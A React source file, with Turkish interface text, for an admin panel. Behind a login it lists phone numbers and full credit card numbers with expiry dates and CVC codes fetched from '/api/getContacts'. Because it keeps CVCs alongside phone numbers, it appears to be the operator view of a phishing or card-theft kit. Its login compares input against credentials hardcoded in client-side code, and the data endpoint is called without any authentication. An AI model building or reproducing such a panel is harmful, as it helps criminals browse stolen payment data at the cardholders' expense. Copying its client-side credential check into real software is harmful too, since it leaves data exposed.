import { useEffect, useState } from 'react'
import axios from 'axios'

function Login({ onLogin }) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState(null)

  const handleSubmit = (e) => {
    e.preventDefault()

    const validUsername = 'K4M4NjJPC_g$*shD'
    const validPassword = 'uXT@!JY*BKmNb27q'

    if (username === validUsername && password === validPassword) {
      setError(null)
      onLogin()
    } else {
      setError('Kullanıcı adı veya şifre hatalı.')
    }
  }

  return (
    <div className="bg-white p-8 rounded-lg shadow-lg max-w-md mx-auto">
      <h1 className="text-4xl font-bold mb-10 text-center">Giriş</h1>
      <form onSubmit={handleSubmit} className="space-y-6">
        <input
          type="text"
          placeholder="Kullanıcı Adı"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
        />
        <input
          type="password"
          placeholder="Şifre"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
        />
        <button
          type="submit"
          className="w-full p-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 focus:outline-none"
        >
          Giriş Yapın
        </button>
      </form>
      {error && <div className="mt-4 text-red-600">{error}</div>}
    </div>
  )
}

export default function AdminPanel() {
  const [contacts, setContacts] = useState([])
  const [creditCards, setCreditCards] = useState([])
  const [loggedIn, setLoggedIn] = useState(false)
  const [timeoutId, setTimeoutId] = useState(null)

  const sessionTimeout = 15 * 60 * 1000

  useEffect(() => {
    if (!loggedIn) return

    async function fetchData() {
      try {
        const response = await axios.get('/api/getContacts')
        setContacts(response.data.kisiler)
        setCreditCards(response.data.krediKartlari)
      } catch (error) {
        console.error(error)
      }
    }

    fetchData()

    const id = setTimeout(() => {
      setLoggedIn(false)
    }, sessionTimeout)

    setTimeoutId(id)

    return () => clearTimeout(id)
  }, [loggedIn])

  const handleLogin = () => {
    setLoggedIn(true)
  }

  return (
    <div className="bg-gray-100 min-h-screen py-12">
      <div className="container mx-auto px-4">
        {!loggedIn ? (
          <Login onLogin={handleLogin} />
        ) : (
          <>
            <h1 className="text-4xl font-bold mb-12 text-center">
              Admin Paneli
            </h1>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              <div className="bg-white p-8 rounded-lg shadow-lg">
                <h2 className="text-2xl font-semibold mb-6">
                  Telefon Numarası
                </h2>
                {contacts.map((contact, index) => (
                  <p
                    key={index}
                    className="border-b border-gray-200 py-2 text-lg"
                  >
                    {contact.phoneNumber}
                  </p>
                ))}
              </div>
              <div className="bg-white p-8 rounded-lg shadow-lg">
                <h2 className="text-2xl font-semibold mb-6">Kredi Kartları</h2>
                {creditCards.map((card, index) => (
                  <div
                    key={index}
                    className="border-b border-gray-200 py-2 text-lg flex justify-between"
                  >
                    <p>{card.cardNumber}</p>
                    <p>{card.expiry}</p>
                    <p>{card.cvc}</p>
                  </div>
                ))}
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
